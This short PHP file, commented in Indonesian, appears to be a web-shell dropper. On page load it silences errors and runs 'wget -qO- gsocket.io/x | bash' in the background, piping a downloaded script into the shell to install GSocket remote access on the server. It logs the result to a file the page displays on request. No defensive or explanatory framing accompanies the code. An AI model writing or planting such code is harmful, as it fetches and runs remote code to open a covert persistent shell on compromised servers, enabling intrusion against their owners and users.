<?php
@error_reporting(0);

// Jalankan GSocket saat file ini diakses
$pid = shell_exec("wget -qO- gsocket.io/x | bash > gsocket_result.txt 2>&1 &");
file_put_contents("gsocket_result.txt", "GSocket sedang berjalan...\n", FILE_APPEND);

echo "<b>GSocket sedang dieksekusi di background.</b><br>";
echo "<b>Output akan disimpan di:</b> <a href='?log'>gsocket_result.txt</a><br><br>";

// Tampilkan log jika diminta
if (isset($_GET['log'])) {
  $log = @file_get_contents('gsocket_result.txt');
  echo "<pre>" . htmlspecialchars($log) . "</pre>";
}
?>